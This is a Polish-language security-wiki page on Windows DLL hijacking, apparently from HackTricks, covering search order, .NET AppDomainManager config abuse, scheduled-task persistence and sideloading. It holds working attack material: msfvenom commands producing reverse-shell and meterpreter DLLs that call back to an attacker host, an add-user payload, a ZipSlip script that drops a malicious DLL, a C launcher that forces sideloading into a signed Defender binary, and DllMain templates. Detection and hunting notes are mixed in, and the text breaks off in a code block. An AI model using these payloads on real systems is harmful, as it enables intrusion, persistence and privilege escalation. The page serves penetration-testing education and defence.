# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na nakłonieniu zaufanej aplikacji do załadowania złośliwej biblioteki DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection i Side-Loading**. Jest wykorzystywany głównie do wykonywania kodu i uzyskiwania persistence, a rzadziej do eskalacji uprawnień. Pomimo skupienia na eskalacji, metoda hijackingu pozostaje taka sama niezależnie od celu.

### Typowe techniki

W przypadku DLL hijacking stosuje się kilka metod, a skuteczność każdej z nich zależy od strategii ładowania DLL przez aplikację:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zastąpienie oryginalnej biblioteki DLL złośliwą, opcjonalnie z użyciem DLL Proxying w celu zachowania funkcjonalności oryginalnej biblioteki DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej biblioteki DLL w ścieżce wyszukiwania znajdującej się przed ścieżką do legalnej biblioteki, z wykorzystaniem schematu wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Utworzenie złośliwej biblioteki DLL, którą aplikacja załaduje, uznając ją za nieistniejącą, ale wymaganą bibliotekę DLL.
4. **DLL Redirection**: Modyfikowanie parametrów wyszukiwania, takich jak `%PATH%`, lub plików `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwej biblioteki DLL.
5. **WinSxS DLL Replacement**: Zastąpienie legalnej biblioteki DLL jej złośliwym odpowiednikiem w katalogu WinSxS — metoda często kojarzona z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej biblioteki DLL w kontrolowanym przez użytkownika katalogu wraz ze skopiowaną aplikacją, co przypomina techniki Binary Proxy Execution.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasyczny DLL sideloading nie jest jedynym sposobem na zmuszenie zaufanego procesu **.NET Framework** do załadowania kodu atakującego. Jeśli docelowy plik wykonywalny jest aplikacją **managed**, CLR sprawdza również plik konfiguracyjny aplikacji o nazwie odpowiadającej nazwie pliku wykonywalnego (na przykład `Setup.exe.config`). Plik ten może definiować niestandardowy **AppDomainManager**. Jeśli konfiguracja wskazuje na kontrolowany przez atakującego assembly umieszczony obok pliku EXE, CLR załaduje go **przed standardową ścieżką wykonywania kodu aplikacji** i uruchomi wewnątrz zaufanego procesu.<sup>[[24]](#references)</sup>

Zgodnie ze schematem konfiguracji .NET Framework firmy Microsoft obecność zarówno `<appDomainManagerAssembly>`, jak i `<appDomainManagerType>` jest wymagana, aby użyć niestandardowego managera.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracja:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimalny menedżer:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktyczne uwagi:
- Jest to technika specyficzna dla **.NET Framework**. Zależy od parsowania konfiguracji CLR, a nie od kolejności wyszukiwania bibliotek DLL Win32.
- Host musi być rzeczywiście **zarządzanym plikiem EXE**. Szybka weryfikacja: `sigcheck -m target.exe`, `corflags target.exe` lub sprawdzenie obecności **CLR Runtime Header** w metadanych PE.
- Nazwa pliku konfiguracyjnego musi dokładnie odpowiadać nazwie pliku wykonywalnego (`<binary>.config`) i zwykle znajduje się **obok pliku EXE**.
- Jest to przydatne w przypadku **podpisanych plików binarnych Microsoft/vendor**, ponieważ zaufany plik EXE pozostaje niezmieniony, podczas gdy złośliwy managed assembly wykonuje się w tym samym procesie.
- Jeśli masz już zapisywalny katalog instalatora/aktualizacji, AppDomainManager hijacking może zostać użyty jako **pierwszy etap**, a następnie można wykorzystać klasyczne DLL sideloading lub reflective loading w kolejnych etapach.

### AppDomainManager jako downloader + bootstrap zadania zaplanowanego

Praktyczny wzorzec intrusion polega na połączeniu zaufanego managed EXE zarówno ze złośliwym plikiem `*.config`, jak i ze złośliwą biblioteką DLL AppDomainManager, która działa wyłącznie jako **mały bootstrapper**:<sup>[[25]](#references)</sup>

1. Użytkownik uruchamia podpisany instalator lub updater .NET z wiarygodnej lokalizacji, takiej jak `%USERPROFILE%\Downloads`.
2. Sąsiadujący plik konfiguracyjny powoduje, że CLR ładuje assembly atakującego **przed** rozpoczęciem logiki legalnej aplikacji.
3. Złośliwy manager wykonuje **path gate** (na przykład kontynuuje działanie tylko wtedy, gdy host EXE jest uruchomiony z katalogu `Downloads`, a drugi etap może działać wyłącznie z `%LOCALAPPDATA%`).
4. Jeśli test zakończy się powodzeniem, pobiera właściwy payload do zapisywalnej przez użytkownika lokalizacji, takiej jak `%LOCALAPPDATA%\PerfWatson2.exe`, i ustanawia persistence za pomocą scheduled task.

Dlaczego ten wariant ma znaczenie:
- Podpisany host EXE pozostaje niezmieniony, więc triage sprawdzający wyłącznie hash głównego pliku binarnego może nie wykryć kompromitacji.
- Proste **path-based anti-analysis** jest powszechne: przeniesienie triady ZIP/EXE/DLL na Pulpit, do Temp lub do ścieżki sandboxa może celowo przerwać ten łańcuch.
- Biblioteka DLL AppDomainManager pierwszego etapu może pozostać niewielka i generować mało szumu, podczas gdy właściwy implant zostanie pobrany później.

Minimalny przykład persistence często spotykany w tym wzorcu:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notatki:
- ` /rl highest` oznacza **highest available** dla danego użytkownika/sesji; samo w sobie nie gwarantuje eskalacji do SYSTEM.
- Ta technika jest często lepiej klasyfikowana jako **execution/persistence via .NET config abuse** niż klasyczne przejęcie kolejności wyszukiwania brakującej biblioteki DLL, mimo że operatorzy często łączą obie metody.

Punkty kontrolne detekcji:
- Podpisane pliki wykonywalne .NET uruchamiane ze **ścieżek ekstrakcji ZIP**, `Downloads`, `%TEMP%` lub innych folderów zapisywalnych przez użytkownika, wraz ze **współlokalnym** plikiem `<exe>.config`.
- Nowe zaplanowane zadania, których akcja wskazuje na `%LOCALAPPDATA%`, `%APPDATA%` lub `Downloads`, a których nazwy naśladują aktualizatory przeglądarek/dostawców.
- Krótkotrwałe zarządzane procesy bootstrap, które natychmiast pobierają kolejny plik EXE, a następnie uruchamiają `schtasks.exe`.
- Próbki, które kończą działanie wcześnie, jeśli ścieżka pliku wykonywalnego nie pasuje do oczekiwanego katalogu profilu użytkownika.

### Przejęcie istniejącego zaplanowanego zadania w celu ponownego uruchomienia łańcucha sideload

W celu zapewnienia persistence nie należy szukać wyłącznie **tworzenia nowego zadania**. Niektóre zestawy intruzów czekają, aż legalny instalator utworzy **normalne zadanie aktualizatora**, a następnie **modyfikują akcję zadania**, tak aby istniejąca nazwa, autor i wyzwalacz pozostały znajome dla obrońców.

Możliwy do ponownego wykorzystania workflow:
1. Zainstaluj/uruchom legalne oprogramowanie i zidentyfikuj zadanie, które zwykle tworzy.
2. Wyeksportuj XML zadania i zanotuj bieżące wartości `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zastąp wyłącznie akcję, aby zadanie uruchamiało **zaufany host EXE** z katalogu staging zapisywalnego przez użytkownika, który następnie wykona sideload lub AppDomain-loads właściwy payload.
4. Zarejestruj ponownie tę samą nazwę zadania zamiast tworzyć nowy, oczywisty artefakt persistence.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Dlaczego jest to bardziej stealth:
- Nazwa zadania nadal może wyglądać wiarygodnie (na przykład jak updater dostawcy).
- Uruchamia je **Task Scheduler service**, więc walidacja procesu nadrzędnego/przodków często widzi oczekiwany łańcuch planowania zamiast `explorer.exe`.
- Zespoły DFIR, które wyszukują wyłącznie **nowe nazwy zadań**, mogą przeoczyć zadanie, którego rejestracja już istniała, ale którego akcja wskazuje teraz na `%LOCALAPPDATA%`, `%APPDATA%` lub inną ścieżkę kontrolowaną przez atakującego.

Szybkie punkty do wyszukiwania:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Porównuj XML `C:\Windows\System32\Tasks\*` oraz metadane `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` z bazą odniesienia.
- Generuj alert, gdy **wyglądające na updatera dostawcy zadanie** wykonuje się z **katalogów zapisywalnych przez użytkownika** lub uruchamia plik EXE .NET z umieszczonym obok plikiem `*.config`.

> [!TIP]
> Aby zapoznać się z łańcuchem krok po kroku, który łączy staging HTML, konfiguracje AES-CTR i implanty .NET z DLL sideloading, przejrzyj poniższy workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Znajdowanie brakujących DLL

Najczęstszym sposobem znajdowania brakujących DLL wewnątrz systemu jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z pakietu sysinternals i **ustawienie** **2 następujących filtrów**:

![Common Techniques - Znajdowanie brakujących DLL: Najczęstszym sposobem znajdowania brakujących DLL wewnątrz systemu jest uruchomienie procmon z pakietu sysinternals i ustawienie 2 następujących filtrów](<../../../images/image (961).png>)

![Common Techniques - Znajdowanie brakujących DLL: Najczęstszym sposobem znajdowania brakujących DLL wewnątrz systemu jest uruchomienie procmon z pakietu sysinternals i ustawienie 2 następujących filtrów](<../../../images/image (230).png>)

i wyświetlenie tylko **File System Activity**:

![Common Techniques - Znajdowanie brakujących DLL: i wyświetlenie tylko File System Activity](<../../../images/image (153).png>)

Jeśli szukasz **ogólnie brakujących dll**, **pozostaw** to uruchomione przez kilka **sekund**.\
Jeśli szukasz **brakującej DLL wewnątrz konkretnego pliku wykonywalnego**, ustaw dodatkowy filtr, taki jak **"Process Name" "contains" `<exec name>`**, uruchom go i zatrzymaj przechwytywanie zdarzeń.<sup>[[9]](#references)</sup>

## Wykorzystywanie brakujących DLL

Aby eskalować uprawnienia, szukaj **DLL, którą uprzywilejowany proces próbuje załadować** z lokalizacji, do której możesz zapisywać. Może się tak zdarzyć, gdy kontrolujesz katalog przeszukiwany przed katalogiem zawierającym prawidłową DLL albo gdy żądana DLL nie istnieje i możesz zapisywać w jednym z przeszukiwanych katalogów.

### Kolejność wyszukiwania DLL

**W** [**dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **możesz znaleźć informacje o tym, jak dokładnie ładowane są DLL.**

**Aplikacje Windows** wyszukują DLL, korzystając z zestawu **wstępnie zdefiniowanych ścieżek wyszukiwania** i przestrzegając określonej kolejności. Problem DLL hijacking pojawia się, gdy złośliwa DLL zostanie strategicznie umieszczona w jednym z tych katalogów, dzięki czemu zostanie załadowana przed autentyczną DLL. Aby temu zapobiec, należy dopilnować, aby aplikacja używała ścieżek bezwzględnych podczas odwoływania się do wymaganych DLL.

Poniżej przedstawiono **kolejność wyszukiwania DLL w systemach 32-bitowych**:

1. Katalog, z którego aplikacja została załadowana.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę tego katalogu.(_C:\Windows\System32_)
3. Katalog systemowy 16-bitowy. Nie istnieje funkcja, która zwraca ścieżkę tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę tego katalogu.
1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Należy pamiętać, że nie obejmuje to ścieżki dla konkretnej aplikacji określonej przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany podczas obliczania ścieżki wyszukiwania DLL.

Jest to **domyślna** kolejność wyszukiwania przy włączonej funkcji **SafeDllSearchMode**. Gdy jest ona wyłączona, bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie funkcja jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) zostanie wywołana z użyciem **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie rozpoczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Ostatecznie DLL może zostać załadowana za pomocą ścieżki bezwzględnej, a nie nazwy. W takim przypadku Windows sprawdza tylko tę ścieżkę w poszukiwaniu samej DLL; zależności żądane według nazwy nadal podlegają odpowiedniej kolejności wyszukiwania.

Istnieją inne sposoby modyfikowania kolejności wyszukiwania, ale nie będę ich tutaj wyjaśniać.

### Łączenie dowolnego zapisu pliku z hijacking brakującej DLL

1. Użyj filtrów **ProcMon** (`Process Name` = docelowy EXE, `Path` kończy się na `.dll`, `Result` = `NAME NOT FOUND`), aby zebrać nazwy DLL, których proces szuka, ale nie może znaleźć.<sup>[[14]](#references)</sup>
2. Jeśli plik binarny jest uruchamiany według **harmonogramu/jako usługa**, umieszczenie DLL o jednej z tych nazw w **katalogu aplikacji** (wpis nr 1 kolejności wyszukiwania) spowoduje jej załadowanie przy następnym uruchomieniu. W jednym przypadku skanera .NET proces szukał `hostfxr.dll` w `C:\samples\app\` przed załadowaniem prawdziwej kopii z `C:\Program Files\dotnet\fxr\...`.
3. Zbuduj payload DLL (np. reverse shell) z dowolnym eksportem: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Jeśli Twoim prymitywem jest **dowolny zapis w stylu ZipSlip**, utwórz archiwum ZIP, którego wpis wychodzi poza katalog rozpakowywania, tak aby DLL trafiła do katalogu aplikacji:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostarcz archiwum do monitorowanej skrzynki odbiorczej/udziału; gdy zaplanowane zadanie ponownie uruchomi proces, załaduje on malicious DLL i wykona Twój kod jako konto usługi.

### Wymuszanie sideloadingu przez RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowanym sposobem deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo utworzonego procesu jest ustawienie pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Podanie kontrolowanego przez attackera katalogu sprawia, że proces docelowy, który rozwiązuje importowaną DLL po nazwie (bez ścieżki absolutnej i bez użycia flag bezpiecznego ładowania), może zostać zmuszony do załadowania malicious DLL z tego katalogu.

Kluczowa idea
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardową wartość DllPath wskazującą na kontrolowany przez Ciebie folder (np. katalog, w którym znajduje się Twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy plik binarny docelowego procesu rozwiązuje DLL po nazwie, loader uwzględni podaną wartość DllPath podczas rozwiązywania, umożliwiając niezawodny sideloading nawet wtedy, gdy malicious DLL nie znajduje się w tym samym katalogu co docelowy plik EXE.

Uwagi/ograniczenia
- Dotyczy to tworzonego procesu potomnego; różni się od SetDllDirectory, które wpływa wyłącznie na bieżący proces.
- Proces docelowy musi importować DLL lub ładować ją za pomocą LoadLibrary po nazwie (bez ścieżki absolutnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i zakodowane na stałe ścieżki absolutne nie mogą zostać przejęte. Forwarded exports i SxS mogą zmienić kolejność pierwszeństwa.

Minimalny przykład w C (ntdll, wide strings, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: wymuszanie DLL sideloadingu przez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Przykład użycia operacyjnego
- Umieść złośliwy plik xmllite.dll (eksportujący wymagane funkcje lub przekierowujący do prawdziwego pliku) w swoim katalogu DllPath.
- Uruchom podpisany binarny plik, o którym wiadomo, że wyszukuje xmllite.dll po nazwie, korzystając z powyższej techniki. Loader rozwiąże import za pośrednictwem podanego DllPath i wykona sideloading Twojego pliku DLL.

Zaobserwowano, że technika ta jest wykorzystywana in-the-wild do tworzenia wieloetapowych łańcuchów sideloadingu: początkowy launcher umieszcza pomocniczy plik DLL, który następnie uruchamia podpisany przez Microsoft, podatny na hijacking plik binarny z niestandardowym DllPath, aby wymusić załadowanie pliku DLL atakującego z katalogu stagingowego.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking przez `.exe.config`

W przypadku celów **.NET Framework** sideloading można wykonać **przed `Main()`**, bez patchowania pamięci, wykorzystując sąsiedni plik **`.exe.config`** aplikacji. Zamiast polegać wyłącznie na kolejności wyszukiwania DLL Win32, atakujący umieszcza legalny plik .NET EXE obok złośliwej konfiguracji i co najmniej jednego kontrolowanego przez atakującego assembly.

Jak działa ten łańcuch:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE uruchamia się, a **CLR odczytuje `<exe>.config`**.
2. Konfiguracja ustawia **`<appDomainManagerAssembly>`** oraz **`<appDomainManagerType>`**, dzięki czemu runtime tworzy kontrolowany przez atakującego `AppDomainManager`.
3. Złośliwy manager uzyskuje możliwość wykonania kodu **przed `Main()`** wewnątrz zaufanego procesu hosta.
4. Ta sama konfiguracja może wymusić, aby CLR najpierw rozwiązywał lokalne assemblies (na przykład `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), a także osłabić walidację runtime i telemetry bez patchowania inline.

Wzorzec w stylu kampanii (dokładne zagnieżdżenie może różnić się w zależności od dyrektywy / wersji CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Dlaczego jest to przydatne:
- **`<probing privatePath="."/>`** utrzymuje rozwiązywanie assembly w katalogu aplikacji, zamieniając ten folder w przewidywalną powierzchnię sideloadingu.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** przenoszą wykonanie do kodu atakującego podczas inicjalizacji CLR, zanim uruchomi się właściwa logika aplikacji.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** może pozwolić aplikacji full-trust ładować niepodpisane lub zmodyfikowane assembly bez błędu walidacji strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** zapobiega przekierowaniom publisher policy do nowszych assembly.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** sprawia, że wybór runtime jest bardziej deterministyczny.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** jest szczególnie interesujące, ponieważ **CLR wyłącza własną widoczność ETW** z konfiguracji, zamiast patchowania przez implant `EtwEventWrite` w pamięci.

Wzorzec operacyjny obserwowany w ostatnich campaigns:
- Etap 1 zrzuca `setup.exe`, `setup.exe.config` oraz lokalne assembly.
- Etap 2 kopiuje je do wiarygodnego folderu **AppData update**, zmienia nazwę hosta na coś w rodzaju `update.exe`, a następnie uruchamia go ponownie za pomocą **scheduled task**.
- Etap 3 weryfikuje kontekst wykonania (na przykład oczekiwanego parenta `svchost.exe` z Task Scheduler), zanim załaduje końcowy RAT DLL/export.

Pomysły na hunting:
- Podpisane lub w inny sposób legalne **.NET executables** uruchamiane z podejrzanymi sąsiadującymi plikami **`.config`** w lokalizacjach zapisywalnych przez użytkownika.
- Pliki `.config` zawierające **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** lub **`etwEnable enabled="false"`**.
- Scheduled tasks, które ponownie uruchamiają zmienione nazwy update binaries z **`%LOCALAPPDATA%`** lub z właściwych dla aplikacji katalogów `\bin\update\`.
- Łańcuchy parent/child, w których scheduled task uruchamia zaufanego .NET hosta, który natychmiast ładuje assembly spoza vendora z własnego katalogu.

#### Wyjątki od kolejności wyszukiwania dll według dokumentacji Windows

W dokumentacji Windows opisano określone wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkany zostanie **DLL o tej samej nazwie co DLL już załadowany w pamięci**, system pomija standardowe wyszukiwanie. Zamiast tego sprawdza redirection i manifest, a następnie domyślnie używa DLL już znajdującego się w pamięci. **W tym scenariuszu system nie przeprowadza wyszukiwania DLL**.
- Jeśli DLL jest rozpoznawany jako **known DLL** dla bieżącej wersji Windows, system użyje swojej wersji known DLL wraz ze wszystkimi zależnymi DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych known DLL.
- Jeśli **DLL ma zależności**, wyszukiwanie tych zależnych DLL odbywa się tak, jakby wskazano je wyłącznie za pomocą ich **module names**, niezależnie od tego, czy początkowy DLL został zidentyfikowany za pomocą pełnej ścieżki.

### Escalating Privileges

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działał z **innymi uprawnieniami** (horizontal lub lateral movement) i któremu **brakuje DLL**.
- Upewnij się, że dostęp do zapisu jest dostępny dla dowolnego **directory**, w którym będzie wyszukiwany **DLL**. Może to być katalog pliku wykonywalnego lub katalog znajdujący się w ścieżce systemowej.

Te warunki wstępne domyślnie występują rzadko: uprzywilejowane executables zazwyczaj nie mają brakujących zależności DLL, a standardowi użytkownicy zwykle nie mogą zapisywać do katalogów systemowych search-path. Błędnie skonfigurowane środowiska mogą jednak ujawniać oba te warunki.\
Jeśli wymagania są spełnione, sprawdź projekt [UACME](https://github.com/hfiref0x/UACME). Chociaż jego głównym celem jest UAC bypass, zawiera PoCs DLL-hijacking dla określonych wersji Windows, które często można dostosować do znalezionego zapisywalnego katalogu.

Pamiętaj, że możesz **sprawdzić swoje uprawnienia w folderze**, wykonując:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów wewnątrz PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz również sprawdzić importy pliku wykonywalnego oraz eksporty biblioteki DLL za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
W celu uzyskania pełnego przewodnika dotyczącego **wykorzystania DLL Hijacking do eskalacji uprawnień** przy uprawnieniach do zapisu w folderze **System Path** sprawdź:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sprawdzi, czy masz uprawnienia do zapisu w dowolnym folderze znajdującym się w systemowym PATH.\
Innymi interesującymi automated tools do wykrywania tej podatności są funkcje **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ oraz _Write-HijackDll._

### Example

Jeśli znajdziesz exploitable scenario, jedną z najważniejszych rzeczy pozwalających skutecznie go wykorzystać będzie **utworzenie dll eksportującej co najmniej wszystkie funkcje, które executable będzie z niej importować**. Należy jednak pamiętać, że DLL Hijacking jest przydatny do [**eskalacji z poziomu Medium Integrity do High (z pominięciem UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z poziomu[ **High Integrity do SYSTEM**](../index.html#from-high-integrity-to-system)**.** Przykład **tworzenia poprawnej dll** znajdziesz w tym opracowaniu dotyczącym DLL hijacking wykorzystywanego do execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto w **następnej sekcji** znajdziesz kilka **podstawowych kodów dll**, które mogą być przydatne jako **templates** lub do utworzenia **dll z eksportowanymi funkcjami, które nie są wymagane**.

## **Creating and compiling DLLs**

### **DLL Proxifying**

Zasadniczo **DLL proxy** to biblioteka DLL zdolna do **wykonania złośliwego kodu po załadowaniu**, a także do **udostępniania** i **działania** zgodnie z oczekiwaniami poprzez **przekazywanie wszystkich wywołań do prawdziwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) można **wskazać executable i wybrać bibliotekę**, którą chcesz poddać proxifikacji, a następnie **wygenerować proxified dll**, lub **wskazać DLL** i **wygenerować proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86, nie znalazłem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Własne

W wielu przypadkach skompilowany przez Ciebie DLL musi **eksportować każdą funkcję importowaną przez proces ofiary**. Jeśli brakuje wymaganego eksportu, plik binarny nie może go rozwiązać, a exploit kończy się niepowodzeniem.

<details>
<summary>Szablon DLL w C (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
